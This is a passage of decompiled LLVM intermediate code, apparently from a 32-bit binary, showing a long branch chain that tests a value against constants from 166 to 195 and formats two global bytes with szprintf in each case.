  %v2_804ba4c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba4c, i32* @ebx, align 4
  %v5_804ba53 = call i32 @szprintf(i32 %v2_804ba4c, i32 ptrtoint ([13 x i8]* @global_var_8058da3.187 to i32), i32 %v1_804ba3d, i32 %v1_804ba31)
  br label %dec_label_pc_804ba5b

dec_label_pc_804ba5b:                             ; preds = %dec_label_pc_804ba28, %dec_label_pc_804ba31
  %v12_804ba5b = icmp eq i32 %v11_8049ac4, 166
  %v1_804ba62 = icmp eq i1 %v12_804ba5b, false
  br i1 %v1_804ba62, label %dec_label_pc_804ba8e, label %dec_label_pc_804ba64

dec_label_pc_804ba64:                             ; preds = %dec_label_pc_804ba5b
  %v0_804ba64 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ba64 = zext i8 %v0_804ba64 to i32
  store i32 %v1_804ba64, i32* @edx, align 4
  %v0_804ba70 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ba70 = zext i8 %v0_804ba70 to i32
  %v2_804ba7f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba7f, i32* @ebx, align 4
  %v5_804ba86 = call i32 @szprintf(i32 %v2_804ba7f, i32 ptrtoint ([14 x i8]* @global_var_8058db0.188 to i32), i32 %v1_804ba70, i32 %v1_804ba64)
  br label %dec_label_pc_804ba8e

dec_label_pc_804ba8e:                             ; preds = %dec_label_pc_804ba5b, %dec_label_pc_804ba64
  %v12_804ba8e = icmp eq i32 %v11_8049ac4, 167
  %v1_804ba95 = icmp eq i1 %v12_804ba8e, false
  br i1 %v1_804ba95, label %dec_label_pc_804bac1, label %dec_label_pc_804ba97

dec_label_pc_804ba97:                             ; preds = %dec_label_pc_804ba8e
  %v0_804ba97 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ba97 = zext i8 %v0_804ba97 to i32
  store i32 %v1_804ba97, i32* @edx, align 4
  %v0_804baa3 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804baa3 = zext i8 %v0_804baa3 to i32
  %v2_804bab2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bab2, i32* @ebx, align 4
  %v5_804bab9 = call i32 @szprintf(i32 %v2_804bab2, i32 ptrtoint ([14 x i8]* @global_var_8058d5e.182 to i32), i32 %v1_804baa3, i32 %v1_804ba97)
  br label %dec_label_pc_804bac1

dec_label_pc_804bac1:                             ; preds = %dec_label_pc_804ba8e, %dec_label_pc_804ba97
  %v12_804bac1 = icmp eq i32 %v11_8049ac4, 168
  %v1_804bac8 = icmp eq i1 %v12_804bac1, false
  br i1 %v1_804bac8, label %dec_label_pc_804baf4, label %dec_label_pc_804baca

dec_label_pc_804baca:                             ; preds = %dec_label_pc_804bac1
  %v0_804baca = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804baca = zext i8 %v0_804baca to i32
  store i32 %v1_804baca, i32* @edx, align 4
  %v0_804bad6 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bad6 = zext i8 %v0_804bad6 to i32
  %v2_804bae5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bae5, i32* @ebx, align 4
  %v5_804baec = call i32 @szprintf(i32 %v2_804bae5, i32 ptrtoint ([14 x i8]* @global_var_8058dbe.189 to i32), i32 %v1_804bad6, i32 %v1_804baca)
  br label %dec_label_pc_804baf4

dec_label_pc_804baf4:                             ; preds = %dec_label_pc_804bac1, %dec_label_pc_804baca
  %v12_804baf4 = icmp eq i32 %v11_8049ac4, 169
  %v1_804bafb = icmp eq i1 %v12_804baf4, false
  br i1 %v1_804bafb, label %dec_label_pc_804bb27, label %dec_label_pc_804bafd

dec_label_pc_804bafd:                             ; preds = %dec_label_pc_804baf4
  %v0_804bafd = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bafd = zext i8 %v0_804bafd to i32
  store i32 %v1_804bafd, i32* @edx, align 4
  %v0_804bb09 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bb09 = zext i8 %v0_804bb09 to i32
  %v2_804bb18 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb18, i32* @ebx, align 4
  %v5_804bb1f = call i32 @szprintf(i32 %v2_804bb18, i32 ptrtoint ([14 x i8]* @global_var_8058dcc.190 to i32), i32 %v1_804bb09, i32 %v1_804bafd)
  br label %dec_label_pc_804bb27

dec_label_pc_804bb27:                             ; preds = %dec_label_pc_804baf4, %dec_label_pc_804bafd
  %v12_804bb27 = icmp eq i32 %v11_8049ac4, 171
  %v1_804bb2e = icmp eq i1 %v12_804bb27, false
  br i1 %v1_804bb2e, label %dec_label_pc_804bb5a, label %dec_label_pc_804bb30

dec_label_pc_804bb30:                             ; preds = %dec_label_pc_804bb27
  %v0_804bb30 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bb30 = zext i8 %v0_804bb30 to i32
  store i32 %v1_804bb30, i32* @edx, align 4
  %v0_804bb3c = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bb3c = zext i8 %v0_804bb3c to i32
  %v2_804bb4b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb4b, i32* @ebx, align 4
  %v5_804bb52 = call i32 @szprintf(i32 %v2_804bb4b, i32 ptrtoint ([14 x i8]* @global_var_8058dda.191 to i32), i32 %v1_804bb3c, i32 %v1_804bb30)
  br label %dec_label_pc_804bb5a

dec_label_pc_804bb5a:                             ; preds = %dec_label_pc_804bb27, %dec_label_pc_804bb30
  %v12_804bb5a = icmp eq i32 %v11_8049ac4, 172
  %v1_804bb61 = icmp eq i1 %v12_804bb5a, false
  br i1 %v1_804bb61, label %dec_label_pc_804bb8d, label %dec_label_pc_804bb63

dec_label_pc_804bb63:                             ; preds = %dec_label_pc_804bb5a
  %v0_804bb63 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bb63 = zext i8 %v0_804bb63 to i32
  store i32 %v1_804bb63, i32* @edx, align 4
  %v0_804bb6f = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bb6f = zext i8 %v0_804bb6f to i32
  %v2_804bb7e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb7e, i32* @ebx, align 4
  %v5_804bb85 = call i32 @szprintf(i32 %v2_804bb7e, i32 ptrtoint ([14 x i8]* @global_var_8058de8.192 to i32), i32 %v1_804bb6f, i32 %v1_804bb63)
  br label %dec_label_pc_804bb8d

dec_label_pc_804bb8d:                             ; preds = %dec_label_pc_804bb5a, %dec_label_pc_804bb63
  %v12_804bb8d = icmp eq i32 %v11_8049ac4, 173
  %v1_804bb94 = icmp eq i1 %v12_804bb8d, false
  br i1 %v1_804bb94, label %dec_label_pc_804bbc0, label %dec_label_pc_804bb96

dec_label_pc_804bb96:                             ; preds = %dec_label_pc_804bb8d
  %v0_804bb96 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bb96 = zext i8 %v0_804bb96 to i32
  store i32 %v1_804bb96, i32* @edx, align 4
  %v0_804bba2 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bba2 = zext i8 %v0_804bba2 to i32
  %v2_804bbb1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbb1, i32* @ebx, align 4
  %v5_804bbb8 = call i32 @szprintf(i32 %v2_804bbb1, i32 ptrtoint ([14 x i8]* @global_var_8058df6.193 to i32), i32 %v1_804bba2, i32 %v1_804bb96)
  br label %dec_label_pc_804bbc0

dec_label_pc_804bbc0:                             ; preds = %dec_label_pc_804bb8d, %dec_label_pc_804bb96
  %v12_804bbc0 = icmp eq i32 %v11_8049ac4, 174
  %v1_804bbc7 = icmp eq i1 %v12_804bbc0, false
  br i1 %v1_804bbc7, label %dec_label_pc_804bbf3, label %dec_label_pc_804bbc9

dec_label_pc_804bbc9:                             ; preds = %dec_label_pc_804bbc0
  %v0_804bbc9 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bbc9 = zext i8 %v0_804bbc9 to i32
  store i32 %v1_804bbc9, i32* @edx, align 4
  %v0_804bbd5 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bbd5 = zext i8 %v0_804bbd5 to i32
  %v2_804bbe4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbe4, i32* @ebx, align 4
  %v5_804bbeb = call i32 @szprintf(i32 %v2_804bbe4, i32 ptrtoint ([13 x i8]* @global_var_8058e04.194 to i32), i32 %v1_804bbd5, i32 %v1_804bbc9)
  br label %dec_label_pc_804bbf3

dec_label_pc_804bbf3:                             ; preds = %dec_label_pc_804bbc0, %dec_label_pc_804bbc9
  %v12_804bbf3 = icmp eq i32 %v11_8049ac4, 175
  %v1_804bbfa = icmp eq i1 %v12_804bbf3, false
  br i1 %v1_804bbfa, label %dec_label_pc_804bc26, label %dec_label_pc_804bbfc

dec_label_pc_804bbfc:                             ; preds = %dec_label_pc_804bbf3
  %v0_804bbfc = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bbfc = zext i8 %v0_804bbfc to i32
  store i32 %v1_804bbfc, i32* @edx, align 4
  %v0_804bc08 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bc08 = zext i8 %v0_804bc08 to i32
  %v2_804bc17 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc17, i32* @ebx, align 4
  %v5_804bc1e = call i32 @szprintf(i32 %v2_804bc17, i32 ptrtoint ([14 x i8]* @global_var_8058e11.195 to i32), i32 %v1_804bc08, i32 %v1_804bbfc)
  br label %dec_label_pc_804bc26

dec_label_pc_804bc26:                             ; preds = %dec_label_pc_804bbf3, %dec_label_pc_804bbfc
  %v9_804bc26 = icmp eq i32 %v11_8049ac4, 176
  %v1_804bc2d = icmp eq i1 %v9_804bc26, false
  br i1 %v1_804bc2d, label %dec_label_pc_804bc59, label %dec_label_pc_804bc2f

dec_label_pc_804bc2f:                             ; preds = %dec_label_pc_804bc26
  %v0_804bc2f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bc2f = zext i8 %v0_804bc2f to i32
  store i32 %v1_804bc2f, i32* @edx, align 4
  %v0_804bc3b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bc3b = zext i8 %v0_804bc3b to i32
  %v2_804bc4a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc4a, i32* @ebx, align 4
  %v5_804bc51 = call i32 @szprintf(i32 %v2_804bc4a, i32 ptrtoint ([14 x i8]* @global_var_8058e1f.196 to i32), i32 %v1_804bc3b, i32 %v1_804bc2f)
  br label %dec_label_pc_804bc59

dec_label_pc_804bc59:                             ; preds = %dec_label_pc_804bc26, %dec_label_pc_804bc2f
  %v12_804bc59 = icmp eq i32 %v11_8049ac4, 177
  %v1_804bc60 = icmp eq i1 %v12_804bc59, false
  br i1 %v1_804bc60, label %dec_label_pc_804bc8c, label %dec_label_pc_804bc62

dec_label_pc_804bc62:                             ; preds = %dec_label_pc_804bc59
  %v0_804bc62 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bc62 = zext i8 %v0_804bc62 to i32
  store i32 %v1_804bc62, i32* @edx, align 4
  %v0_804bc6e = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bc6e = zext i8 %v0_804bc6e to i32
  %v2_804bc7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc7d, i32* @ebx, align 4
  %v5_804bc84 = call i32 @szprintf(i32 %v2_804bc7d, i32 ptrtoint ([14 x i8]* @global_var_8058e2d.197 to i32), i32 %v1_804bc6e, i32 %v1_804bc62)
  br label %dec_label_pc_804bc8c

dec_label_pc_804bc8c:                             ; preds = %dec_label_pc_804bc59, %dec_label_pc_804bc62
  %v12_804bc8c = icmp eq i32 %v11_8049ac4, 178
  %v1_804bc93 = icmp eq i1 %v12_804bc8c, false
  br i1 %v1_804bc93, label %dec_label_pc_804bcbf, label %dec_label_pc_804bc95

dec_label_pc_804bc95:                             ; preds = %dec_label_pc_804bc8c
  %v0_804bc95 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bc95 = zext i8 %v0_804bc95 to i32
  store i32 %v1_804bc95, i32* @edx, align 4
  %v0_804bca1 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bca1 = zext i8 %v0_804bca1 to i32
  %v2_804bcb0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcb0, i32* @ebx, align 4
  %v5_804bcb7 = call i32 @szprintf(i32 %v2_804bcb0, i32 ptrtoint ([13 x i8]* @global_var_8058e3b.198 to i32), i32 %v1_804bca1, i32 %v1_804bc95)
  br label %dec_label_pc_804bcbf

dec_label_pc_804bcbf:                             ; preds = %dec_label_pc_804bc8c, %dec_label_pc_804bc95
  %v12_804bcbf = icmp eq i32 %v11_8049ac4, 179
  %v1_804bcc6 = icmp eq i1 %v12_804bcbf, false
  br i1 %v1_804bcc6, label %dec_label_pc_804bcf2, label %dec_label_pc_804bcc8

dec_label_pc_804bcc8:                             ; preds = %dec_label_pc_804bcbf
  %v0_804bcc8 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bcc8 = zext i8 %v0_804bcc8 to i32
  store i32 %v1_804bcc8, i32* @edx, align 4
  %v0_804bcd4 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bcd4 = zext i8 %v0_804bcd4 to i32
  %v2_804bce3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bce3, i32* @ebx, align 4
  %v5_804bcea = call i32 @szprintf(i32 %v2_804bce3, i32 ptrtoint ([13 x i8]* @global_var_8058e48.199 to i32), i32 %v1_804bcd4, i32 %v1_804bcc8)
  br label %dec_label_pc_804bcf2

dec_label_pc_804bcf2:                             ; preds = %dec_label_pc_804bcbf, %dec_label_pc_804bcc8
  %v12_804bcf2 = icmp eq i32 %v11_8049ac4, 180
  %v1_804bcf9 = icmp eq i1 %v12_804bcf2, false
  br i1 %v1_804bcf9, label %dec_label_pc_804bd25, label %dec_label_pc_804bcfb

dec_label_pc_804bcfb:                             ; preds = %dec_label_pc_804bcf2
  %v0_804bcfb = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bcfb = zext i8 %v0_804bcfb to i32
  store i32 %v1_804bcfb, i32* @edx, align 4
  %v0_804bd07 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bd07 = zext i8 %v0_804bd07 to i32
  %v2_804bd16 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd16, i32* @ebx, align 4
  %v5_804bd1d = call i32 @szprintf(i32 %v2_804bd16, i32 ptrtoint ([13 x i8]* @global_var_8058e55.200 to i32), i32 %v1_804bd07, i32 %v1_804bcfb)
  br label %dec_label_pc_804bd25

dec_label_pc_804bd25:                             ; preds = %dec_label_pc_804bcf2, %dec_label_pc_804bcfb
  %v12_804bd25 = icmp eq i32 %v11_8049ac4, 181
  %v1_804bd2c = icmp eq i1 %v12_804bd25, false
  br i1 %v1_804bd2c, label %dec_label_pc_804bd58, label %dec_label_pc_804bd2e

dec_label_pc_804bd2e:                             ; preds = %dec_label_pc_804bd25
  %v0_804bd2e = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bd2e = zext i8 %v0_804bd2e to i32
  store i32 %v1_804bd2e, i32* @edx, align 4
  %v0_804bd3a = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bd3a = zext i8 %v0_804bd3a to i32
  %v2_804bd49 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd49, i32* @ebx, align 4
  %v5_804bd50 = call i32 @szprintf(i32 %v2_804bd49, i32 ptrtoint ([13 x i8]* @global_var_8058e62.201 to i32), i32 %v1_804bd3a, i32 %v1_804bd2e)
  br label %dec_label_pc_804bd58

dec_label_pc_804bd58:                             ; preds = %dec_label_pc_804bd25, %dec_label_pc_804bd2e
  %v12_804bd58 = icmp eq i32 %v11_8049ac4, 182
  %v1_804bd5f = icmp eq i1 %v12_804bd58, false
  br i1 %v1_804bd5f, label %dec_label_pc_804bd8b, label %dec_label_pc_804bd61

dec_label_pc_804bd61:                             ; preds = %dec_label_pc_804bd58
  %v0_804bd61 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bd61 = zext i8 %v0_804bd61 to i32
  store i32 %v1_804bd61, i32* @edx, align 4
  %v0_804bd6d = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bd6d = zext i8 %v0_804bd6d to i32
  %v2_804bd7c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd7c, i32* @ebx, align 4
  %v5_804bd83 = call i32 @szprintf(i32 %v2_804bd7c, i32 ptrtoint ([13 x i8]* @global_var_8058e6f.202 to i32), i32 %v1_804bd6d, i32 %v1_804bd61)
  br label %dec_label_pc_804bd8b

dec_label_pc_804bd8b:                             ; preds = %dec_label_pc_804bd58, %dec_label_pc_804bd61
  %v12_804bd8b = icmp eq i32 %v11_8049ac4, 183
  %v1_804bd92 = icmp eq i1 %v12_804bd8b, false
  br i1 %v1_804bd92, label %dec_label_pc_804bdbe, label %dec_label_pc_804bd94

dec_label_pc_804bd94:                             ; preds = %dec_label_pc_804bd8b
  %v0_804bd94 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bd94 = zext i8 %v0_804bd94 to i32
  store i32 %v1_804bd94, i32* @edx, align 4
  %v0_804bda0 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bda0 = zext i8 %v0_804bda0 to i32
  %v2_804bdaf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdaf, i32* @ebx, align 4
  %v5_804bdb6 = call i32 @szprintf(i32 %v2_804bdaf, i32 ptrtoint ([13 x i8]* @global_var_80587ba.73 to i32), i32 %v1_804bda0, i32 %v1_804bd94)
  br label %dec_label_pc_804bdbe

dec_label_pc_804bdbe:                             ; preds = %dec_label_pc_804bd8b, %dec_label_pc_804bd94
  %v12_804bdbe = icmp eq i32 %v11_8049ac4, 184
  %v1_804bdc5 = icmp eq i1 %v12_804bdbe, false
  br i1 %v1_804bdc5, label %dec_label_pc_804bdf1, label %dec_label_pc_804bdc7

dec_label_pc_804bdc7:                             ; preds = %dec_label_pc_804bdbe
  %v0_804bdc7 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bdc7 = zext i8 %v0_804bdc7 to i32
  store i32 %v1_804bdc7, i32* @edx, align 4
  %v0_804bdd3 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bdd3 = zext i8 %v0_804bdd3 to i32
  %v2_804bde2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bde2, i32* @ebx, align 4
  %v5_804bde9 = call i32 @szprintf(i32 %v2_804bde2, i32 ptrtoint ([13 x i8]* @global_var_8058e7c.203 to i32), i32 %v1_804bdd3, i32 %v1_804bdc7)
  br label %dec_label_pc_804bdf1

dec_label_pc_804bdf1:                             ; preds = %dec_label_pc_804bdbe, %dec_label_pc_804bdc7
  %v12_804bdf1 = icmp eq i32 %v11_8049ac4, 185
  %v1_804bdf8 = icmp eq i1 %v12_804bdf1, false
  br i1 %v1_804bdf8, label %dec_label_pc_804be24, label %dec_label_pc_804bdfa

dec_label_pc_804bdfa:                             ; preds = %dec_label_pc_804bdf1
  %v0_804bdfa = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bdfa = zext i8 %v0_804bdfa to i32
  store i32 %v1_804bdfa, i32* @edx, align 4
  %v0_804be06 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804be06 = zext i8 %v0_804be06 to i32
  %v2_804be15 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be15, i32* @ebx, align 4
  %v5_804be1c = call i32 @szprintf(i32 %v2_804be15, i32 ptrtoint ([13 x i8]* @global_var_8058e89.204 to i32), i32 %v1_804be06, i32 %v1_804bdfa)
  br label %dec_label_pc_804be24

dec_label_pc_804be24:                             ; preds = %dec_label_pc_804bdf1, %dec_label_pc_804bdfa
  %v12_804be24 = icmp eq i32 %v11_8049ac4, 186
  %v1_804be2b = icmp eq i1 %v12_804be24, false
  br i1 %v1_804be2b, label %dec_label_pc_804be57, label %dec_label_pc_804be2d

dec_label_pc_804be2d:                             ; preds = %dec_label_pc_804be24
  %v0_804be2d = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804be2d = zext i8 %v0_804be2d to i32
  store i32 %v1_804be2d, i32* @edx, align 4
  %v0_804be39 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804be39 = zext i8 %v0_804be39 to i32
  %v2_804be48 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be48, i32* @ebx, align 4
  %v5_804be4f = call i32 @szprintf(i32 %v2_804be48, i32 ptrtoint ([14 x i8]* @global_var_8058e96.205 to i32), i32 %v1_804be39, i32 %v1_804be2d)
  br label %dec_label_pc_804be57

dec_label_pc_804be57:                             ; preds = %dec_label_pc_804be24, %dec_label_pc_804be2d
  %v12_804be57 = icmp eq i32 %v11_8049ac4, 187
  %v1_804be5e = icmp eq i1 %v12_804be57, false
  br i1 %v1_804be5e, label %dec_label_pc_804be8a, label %dec_label_pc_804be60

dec_label_pc_804be60:                             ; preds = %dec_label_pc_804be57
  %v0_804be60 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804be60 = zext i8 %v0_804be60 to i32
  store i32 %v1_804be60, i32* @edx, align 4
  %v0_804be6c = load i8, i8* @global_var_805d499.29, align 1
  %v1_804be6c = zext i8 %v0_804be6c to i32
  %v2_804be7b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be7b, i32* @ebx, align 4
  %v5_804be82 = call i32 @szprintf(i32 %v2_804be7b, i32 ptrtoint ([14 x i8]* @global_var_8058ea4.206 to i32), i32 %v1_804be6c, i32 %v1_804be60)
  br label %dec_label_pc_804be8a

dec_label_pc_804be8a:                             ; preds = %dec_label_pc_804be57, %dec_label_pc_804be60
  %v12_804be8a = icmp eq i32 %v11_8049ac4, 188
  %v1_804be91 = icmp eq i1 %v12_804be8a, false
  br i1 %v1_804be91, label %dec_label_pc_804bebd, label %dec_label_pc_804be93

dec_label_pc_804be93:                             ; preds = %dec_label_pc_804be8a
  %v0_804be93 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804be93 = zext i8 %v0_804be93 to i32
  store i32 %v1_804be93, i32* @edx, align 4
  %v0_804be9f = load i8, i8* @global_var_805d499.29, align 1
  %v1_804be9f = zext i8 %v0_804be9f to i32
  %v2_804beae = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804beae, i32* @ebx, align 4
  %v5_804beb5 = call i32 @szprintf(i32 %v2_804beae, i32 ptrtoint ([14 x i8]* @global_var_8058eb2.207 to i32), i32 %v1_804be9f, i32 %v1_804be93)
  br label %dec_label_pc_804bebd

dec_label_pc_804bebd:                             ; preds = %dec_label_pc_804be8a, %dec_label_pc_804be93
  %v12_804bebd = icmp eq i32 %v11_8049ac4, 189
  %v1_804bec4 = icmp eq i1 %v12_804bebd, false
  br i1 %v1_804bec4, label %dec_label_pc_804bef0, label %dec_label_pc_804bec6

dec_label_pc_804bec6:                             ; preds = %dec_label_pc_804bebd
  %v0_804bec6 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bec6 = zext i8 %v0_804bec6 to i32
  store i32 %v1_804bec6, i32* @edx, align 4
  %v0_804bed2 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bed2 = zext i8 %v0_804bed2 to i32
  %v2_804bee1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bee1, i32* @ebx, align 4
  %v5_804bee8 = call i32 @szprintf(i32 %v2_804bee1, i32 ptrtoint ([14 x i8]* @global_var_8058ec0.208 to i32), i32 %v1_804bed2, i32 %v1_804bec6)
  br label %dec_label_pc_804bef0

dec_label_pc_804bef0:                             ; preds = %dec_label_pc_804bebd, %dec_label_pc_804bec6
  %v12_804bef0 = icmp eq i32 %v11_8049ac4, 190
  %v1_804bef7 = icmp eq i1 %v12_804bef0, false
  br i1 %v1_804bef7, label %dec_label_pc_804bf23, label %dec_label_pc_804bef9

dec_label_pc_804bef9:                             ; preds = %dec_label_pc_804bef0
  %v0_804bef9 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bef9 = zext i8 %v0_804bef9 to i32
  store i32 %v1_804bef9, i32* @edx, align 4
  %v0_804bf05 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bf05 = zext i8 %v0_804bf05 to i32
  %v2_804bf14 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf14, i32* @ebx, align 4
  %v5_804bf1b = call i32 @szprintf(i32 %v2_804bf14, i32 ptrtoint ([14 x i8]* @global_var_8058ece.209 to i32), i32 %v1_804bf05, i32 %v1_804bef9)
  br label %dec_label_pc_804bf23

dec_label_pc_804bf23:                             ; preds = %dec_label_pc_804bef0, %dec_label_pc_804bef9
  %v12_804bf23 = icmp eq i32 %v11_8049ac4, 191
  %v1_804bf2a = icmp eq i1 %v12_804bf23, false
  br i1 %v1_804bf2a, label %dec_label_pc_804bf56, label %dec_label_pc_804bf2c

dec_label_pc_804bf2c:                             ; preds = %dec_label_pc_804bf23
  %v0_804bf2c = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bf2c = zext i8 %v0_804bf2c to i32
  store i32 %v1_804bf2c, i32* @edx, align 4
  %v0_804bf38 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bf38 = zext i8 %v0_804bf38 to i32
  %v2_804bf47 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf47, i32* @ebx, align 4
  %v5_804bf4e = call i32 @szprintf(i32 %v2_804bf47, i32 ptrtoint ([14 x i8]* @global_var_8058edc.210 to i32), i32 %v1_804bf38, i32 %v1_804bf2c)
  br label %dec_label_pc_804bf56

dec_label_pc_804bf56:                             ; preds = %dec_label_pc_804bf23, %dec_label_pc_804bf2c
  %v9_804bf56 = icmp eq i32 %v11_8049ac4, 192
  %v1_804bf5d = icmp eq i1 %v9_804bf56, false
  br i1 %v1_804bf5d, label %dec_label_pc_804bf89, label %dec_label_pc_804bf5f

dec_label_pc_804bf5f:                             ; preds = %dec_label_pc_804bf56
  %v0_804bf5f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bf5f = zext i8 %v0_804bf5f to i32
  store i32 %v1_804bf5f, i32* @edx, align 4
  %v0_804bf6b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bf6b = zext i8 %v0_804bf6b to i32
  %v2_804bf7a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf7a, i32* @ebx, align 4
  %v5_804bf81 = call i32 @szprintf(i32 %v2_804bf7a, i32 ptrtoint ([13 x i8]* @global_var_8058eea.211 to i32), i32 %v1_804bf6b, i32 %v1_804bf5f)
  br label %dec_label_pc_804bf89

dec_label_pc_804bf89:                             ; preds = %dec_label_pc_804bf56, %dec_label_pc_804bf5f
  %v12_804bf89 = icmp eq i32 %v11_8049ac4, 193
  %v1_804bf90 = icmp eq i1 %v12_804bf89, false
  br i1 %v1_804bf90, label %dec_label_pc_804bfbc, label %dec_label_pc_804bf92

dec_label_pc_804bf92:                             ; preds = %dec_label_pc_804bf89
  %v0_804bf92 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bf92 = zext i8 %v0_804bf92 to i32
  store i32 %v1_804bf92, i32* @edx, align 4
  %v0_804bf9e = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bf9e = zext i8 %v0_804bf9e to i32
  %v2_804bfad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfad, i32* @ebx, align 4
  %v5_804bfb4 = call i32 @szprintf(i32 %v2_804bfad, i32 ptrtoint ([13 x i8]* @global_var_8058ef7.212 to i32), i32 %v1_804bf9e, i32 %v1_804bf92)
  br label %dec_label_pc_804bfbc

dec_label_pc_804bfbc:                             ; preds = %dec_label_pc_804bf89, %dec_label_pc_804bf92
  %v12_804bfbc = icmp eq i32 %v11_8049ac4, 194
  %v1_804bfc3 = icmp eq i1 %v12_804bfbc, false
  br i1 %v1_804bfc3, label %dec_label_pc_804bfef, label %dec_label_pc_804bfc5

dec_label_pc_804bfc5:                             ; preds = %dec_label_pc_804bfbc
  %v0_804bfc5 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bfc5 = zext i8 %v0_804bfc5 to i32
  store i32 %v1_804bfc5, i32* @edx, align 4
  %v0_804bfd1 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804bfd1 = zext i8 %v0_804bfd1 to i32
  %v2_804bfe0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfe0, i32* @ebx, align 4
  %v5_804bfe7 = call i32 @szprintf(i32 %v2_804bfe0, i32 ptrtoint ([14 x i8]* @global_var_8058f04.213 to i32), i32 %v1_804bfd1, i32 %v1_804bfc5)
  br label %dec_label_pc_804bfef

dec_label_pc_804bfef:                             ; preds = %dec_label_pc_804bfbc, %dec_label_pc_804bfc5
  %v12_804bfef = icmp eq i32 %v11_8049ac4, 195
  %v1_804bff6 = icmp eq i1 %v12_804bfef, false
  br i1 %v1_804bff6, label %dec_label_pc_804c022, label %dec_label_pc_804bff8

dec_label_pc_804bff8:                             ; preds = %dec_label_pc_804bfef
  %v0_804bff8 = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804bff8 = zext i8 %v0_804bff8 to i32
  store i32 %v1_804bff8, i32* @edx, align 4
  %v0_804c004 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c004 = zext i8 %v0_804c004 to i32
  %v2_804c013 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c013, i32* @ebx, align 4
  %v5_804c01a = call i32 @szprintf(i32 %v2_804c013, i32 ptrtoint ([14 x i8]* @global_var_8058f12.214 to i32), i32 %v1_804c004, i32 %v1_804bff8)
  br label %dec_label_pc_804c022

